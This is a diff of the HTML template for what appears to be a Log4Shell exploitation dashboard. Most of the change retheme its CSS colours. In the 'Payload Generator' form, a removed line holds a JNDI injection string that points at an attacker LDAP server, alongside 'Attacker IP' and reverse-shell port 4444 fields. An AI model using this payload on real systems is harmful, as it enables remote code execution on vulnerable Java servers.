@@ -9,16 +9,18 @@
         @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap');
         
         :root {
-            --bg-primary: #0a0e27;
-            --bg-secondary: #151932;
-            --bg-card: #1a1f3a;
-            --accent-primary: #00ff88;
-            --accent-secondary: #00d4ff;
+            --bg-primary: #0B0F14;
+            --bg-secondary: #0F1A2B;
+            --bg-card: #121923;
+            --accent-primary: #D41414;
+            --accent-primary-hover: #FF2A2A;
+            --accent-secondary: #1F6AFF;
+            --glow-color: #00C2FF;
             --accent-danger: #ff3366;
             --accent-warning: #ffaa00;
-            --text-primary: #e4e4e7;
-            --text-secondary: #a1a1aa;
-            --border-color: #2d3250;
+            --text-primary: #F2F4F8;
+            --text-secondary: #8A8F98;
+            --border-color: #223247;
         }
         
         * {
@@ -66,8 +68,8 @@
         }
         
         .score-badge {
-            background: linear-gradient(135deg, var(--accent-primary), #00cc70);
-            color: var(--bg-primary);
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-primary-hover));
+            color: var(--text-primary);
             padding: 8px 20px;
             border-radius: 20px;
             font-weight: 700;
@@ -152,8 +154,8 @@
         }
         
         .btn-primary {
-            background: linear-gradient(135deg, var(--accent-primary), #00cc70);
-            color: var(--bg-primary);
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-primary-hover));
+            color: var(--text-primary);
         }
         
         .btn-danger {
@@ -242,8 +244,8 @@
         }
         
         .status-dot.online {
-            background: var(--accent-primary);
-            box-shadow: 0 0 10px var(--accent-primary);
+            background: var(--glow-color);
+            box-shadow: 0 0 10px var(--glow-color);
         }
         
         .status-dot.offline {
@@ -264,7 +266,7 @@
         }
         
         .badge-success {
-            background: rgba(0, 255, 136, 0.2);
+            background: rgba(212, 20, 20, 0.16);
             color: var(--accent-primary);
             border: 1px solid var(--accent-primary);
         }
@@ -289,7 +291,7 @@
             margin-bottom: 8px;
             padding: 8px;
             border-left: 2px solid var(--accent-primary);
-            background: rgba(0, 255, 136, 0.03);
+            background: rgba(0, 194, 255, 0.06);
             border-radius: 4px;
         }
         
@@ -322,7 +324,7 @@
         }
         
         .alert-success {
-            background: rgba(0, 255, 136, 0.1);
+            background: rgba(212, 20, 20, 0.12);
             border-left: 4px solid var(--accent-primary);
             color: var(--accent-primary);
         }
@@ -381,12 +383,12 @@
                     <h2 class="card-title">Payload Generator</h2>
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Attacker IP</label>
-                    <input type="text" class="form-control" id="attacker-ip" value="192.168.126.131">
+                    <label class="form-label">LDAP Host</label>
+                    <input type="text" class="form-control" id="attacker-ip" value="{{ runtime.ldap_host }}">
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Port</label>
-                    <input type="number" class="form-control" id="port" value="4444">
+                    <label class="form-label">LDAP Port</label>
+                    <input type="number" class="form-control" id="port" value="{{ runtime.ldap_port }}">
                 </div>
                 <div class="form-group">
                     <label class="form-label">Type</label>
@@ -408,11 +410,11 @@
                 </div>
                 <div class="form-group">
                     <label class="form-label">Target</label>
-                    <input type="text" class="form-control" id="target" value="192.168.126.131:8080">
+                    <input type="text" class="form-control" id="target" value="{{ runtime.target }}">
                 </div>
                 <div class="form-group">
                     <label class="form-label">Payload</label>
-                    <input type="text" class="form-control" id="attack-payload" value="${jndi:ldap://192.168.126.131:1389/Rev}">
+                    <input type="text" class="form-control" id="attack-payload" value="{{ runtime.payload }}">
                 </div>
                 <button class="btn btn-warning btn-block" onclick="startWebServer()">
                     <i class="fas fa-globe"></i> Start Web Server
